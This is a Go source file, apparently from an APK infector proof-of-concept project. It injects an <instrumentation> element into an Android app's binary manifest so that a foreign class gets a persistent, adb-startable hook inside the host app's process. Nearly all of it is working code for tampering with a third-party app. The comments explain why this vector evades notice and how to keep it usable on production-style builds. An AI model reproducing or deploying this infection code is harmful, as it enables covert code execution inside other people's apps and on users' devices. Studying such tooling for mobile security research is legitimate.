package manifest

// Instrumentation injection vector.
//
// Injects <instrumentation android:name="aaaaaaaaaaaa.ArchinomeInstrumentation"
// android:targetPackage="<host package>" android:functionalTest="true"/> as a
// child of <manifest>, immediately in front of <application> - the same place
// the <uses-permission> vector uses (see internet_patch.go).
//
// Why it exists: an <instrumentation> entry is the only manifest declaration the
// platform loads into *another* process on demand (PackageManagerService
// instantiates the class in the target package's process when an instrumentation
// is started, e.g. `am instrument -w <pkg>/aaaaaaaaaaaa.ArchinomeInstrumentation`).
// That gives a persistent, adb-startable hook into the host's process without
// touching android:name on <application> and without the host ever having to be
// launched by the user. functionalTest=true keeps the entry usable on
// production-style builds where the developer option "enable instrumentation
// without signature" is set, and targetPackage must be the host package itself
// or the platform refuses to resolve the component.
//
// Binary AXML surgery, same approach as PatchReceiver / PatchProvider:
//   1. append the strings this vector needs (tag name, class name, package name)
//      plus, for every attribute name the host resource map does not cover yet,
//      the name string and its resource-map slot
//   2. insert <instrumentation .../> right before the <application> start tag
//   3. fix the AXML total size
//
// The attribute list is built in ascending resource-id order
// (name 0x01010003 < targetPackage 0x01010021 < functionalTest 0x01010023), the
// repository invariant documented in patcher.go.

import (
	"fmt"
	"log"
	"os"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

// PatchInstrumentation injects the instrumentation element into the binary
// manifest at utils.ManifestBinaryPath and rewrites it in place. The target
// package is read from the decoded manifest (AndroidManifest_plaintext.xml).
func PatchInstrumentation() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)
	if idx := pool.indexOf(data, instrumentationClassName); idx >= 0 {
		fmt.Printf("\t--%s already declared in the manifest; nothing to add\n", instrumentationClassName)
		return
	}

	pkg := getPackageName()
	if pkg == "" {
		log.Panic("package name not found")
	}

	p := newAxPatch(data)

	// the insertion point is the <application> start tag: the element becomes a
	// <manifest> child sitting right in front of it
	appStart := findApplicationElement(data, p.pool)

	tagIdx := p.addString(instrumentationTagStr)
	classIdx := p.addString(instrumentationClassName)
	pkgIdx := p.addString(pkg)

	attrs := []elemAttr{
		{p.androidNs, p.ensureAttr(resIDName, "name"), classIdx, uint8(AttrTypeString), classIdx},
		{p.androidNs, p.ensureAttr(resIDTargetPackage, "targetPackage"), pkgIdx, uint8(AttrTypeString), pkgIdx},
		{p.androidNs, p.ensureAttr(resIDFunctionalTest, "functionalTest"), attrBoolTrue, uint8(AttrTypeIntBool), attrBoolTrue},
	}
	assertAscendingResIDs(p.allResIDs(), attrs)

	element := append(buildStartTag(tagIdx, attrs), buildEndTag(tagIdx)...)
	p.insertElement(appStart, element)

	out := p.commit("<instrumentation " + instrumentationClassName + ">")
	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("\ttargetPackage=%s functionalTest=true", pkg)
}
